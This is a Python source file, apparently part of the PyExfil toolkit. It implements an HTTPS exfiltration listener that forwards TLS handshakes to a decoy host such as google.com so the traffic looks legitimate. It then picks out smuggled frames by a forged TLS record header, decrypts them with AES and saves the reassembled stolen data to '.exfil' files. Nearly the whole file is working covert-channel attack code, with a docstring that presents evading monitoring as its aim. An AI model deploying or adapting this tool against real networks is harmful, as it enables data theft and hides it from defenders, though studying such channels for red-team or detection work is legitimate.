#!/usr/bin/env python3

"""
Using HTTPS with a custom certificate to exfiltrate data.
This is interesting because other than the handshake that can be monitored,
the actual information transfered is gibberish and there is no way of knowing
whether the data is encrypted with that certificate or not, unless you have
the original private key (which you dont!)
"""

import os
import sys
import struct
import socket
import random
import threading

from pyexfil.includes.base import NetworkModule
from pyexfil.includes.encryption_wrappers import AESEncryptOFB, AESDecryptOFB


class HTTPSExfiltrationServer(NetworkModule):
    MODULE_NAME = "HTTPS"
    PROTOCOL = "https/tcp"

    def __init__(self, key, host, duplicate_host="google.com", port=443,
                 max_connections=5, max_size=8192, file_mode=False, verbose=False):
        super().__init__(host=host, port=port, enc_key=key, verbose=verbose)
        self.duplicate_host = duplicate_host
        self.max_connections = max_connections
        self.max_size = max_size
        self.file_mode = file_mode
        self._key = key

    def _send_impl(self, data, **kwargs):
        raise NotImplementedError("HTTPSExfiltrationServer is receive-only.")

    def _create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind((self.host, self.port))
            sock.listen(self.max_connections)
        except socket.error as e:
            sys.stderr.write("[-]\tSocket error trying to listen to %s:%s.\n"
                             % (self.host, self.port))
            sys.stderr.write(str(e) + "\n")
            sys.exit(1)
        sys.stdout.write("[+]\tEstablished a listening on %s:%s.\n"
                         % (self.host, self.port))
        return sock

    def _clientthread(self, conn, callback):
        complete_data = None

        try:
            frwd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            frwd.connect((self.duplicate_host, 443))
        except socket.error as e:
            sys.stderr.write("[!]\tCould not establish connection to duplication host.\n%s.\n" % e)
            return

        while True:
            data = conn.recv(self.max_size)

            if len(data) > 0:
                if data[:3] == b"\x17\x03\x03":
                    if data[:6] == b"\x17\x03\x03\x16\x05\x16":
                        sys.stdout.write("[.]\tGot data termination indicator.\n")

                        if self.file_mode:
                            file_name = (self.host + str(self.port)
                                         + str(random.randint(1000, 9999)) + ".exfil")
                            try:
                                with open(file_name, 'wb') as f:
                                    f.write(complete_data)
                                sys.stdout.write("[+]\tWrote file to '%s'.\n" % file_name)
                            except IOError as e:
                                sys.stderr.write(
                                    "[-]\tThere was an error opening the file to write.\n%s.\n" % e
                                )
                            except ValueError as e:
                                sys.stderr.write("[-]\tCan't write because '%s'.\n" % e)
                        else:
                            sys.stdout.write("[.]\tEntire Data stream:\n\t\t'%s'\n"
                                            % complete_data)

                        if complete_data is not None and callback is not None:
                            meta = {
                                "addr": conn.getpeername(),
                                "file_mode": self.file_mode,
                            }
                            callback(complete_data, meta)

                        complete_data = None
                        try:
                            frwd.close()
                            conn.close()
                        except Exception:
                            pass
                        sys.stdout.write("[.]\tClosing connection.\n")
                        break

                    else:
                        if self.file_mode:
                            size, counter, total_count = struct.unpack(">hhh", data[3:9])
                            dec_me = data[9:]
                            sys.stdout.write("[.]\tGetting chunk %s\\%s with size %s.\n"
                                            % (counter, total_count, size))
                            dec_data = AESDecryptOFB(self._key, dec_me)
                            if len(dec_data) == 0:
                                sys.stdout.write("[-]\tKeys does not match. Unable to decrypt.\n")
                            else:
                                complete_data = (dec_data if complete_data is None
                                                 else complete_data + dec_data)
                        else:
                            size = struct.unpack(">h", data[3:5])[0]
                            dec_me = data[5:]
                            sys.stdout.write("[+]\tGot data from socket with length of %s.\n"
                                            % size)
                            dec_data = AESDecryptOFB(self._key, dec_me)
                            if len(dec_data) == 0:
                                sys.stdout.write("[-]\tKeys does not match. Unable to decrypt.\n")
                            else:
                                complete_data = (dec_data if complete_data is None
                                                 else complete_data + dec_data)
                else:
                    try:
                        sys.stdout.write("[.]\tSeems handshake, continuing forwarding traffic.\n")
                        frwd.send(data)
                        ret = frwd.recv(self.max_size)
                        conn.send(ret)
                    except Exception:
                        sys.stderr.write("[-]\tSomething broke the forwarding. Recreating.\n")
                        frwd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        frwd.connect((self.duplicate_host, 443))
                        sys.stdout.write("[+]\tCreated.\n")

    def _listen_impl(self, callback, **kwargs):
        sock_obj = self._create_socket()
        while not self._stop_event.is_set():
            try:
                conn, address = sock_obj.accept()
                sys.stdout.write("[+]\tReceived a connection from %s:%s.\n"
                                 % (address[0], address[1]))
                t = threading.Thread(target=self._clientthread, args=(conn, callback),
                                     daemon=True)
                t.start()
            except KeyboardInterrupt:
                sock_obj.close()
                sys.stdout.write("\nGot KeyboardInterrupt, exiting now.\n")
                break

    def startlistening(self, callback=None):
        self._listen_impl(callback)


if __name__ == "__main__":
    server = HTTPSExfiltrationServer(host="127.0.0.1", key="123",
                                     duplicate_host="google.com", file_mode=True)
    server.startlistening()
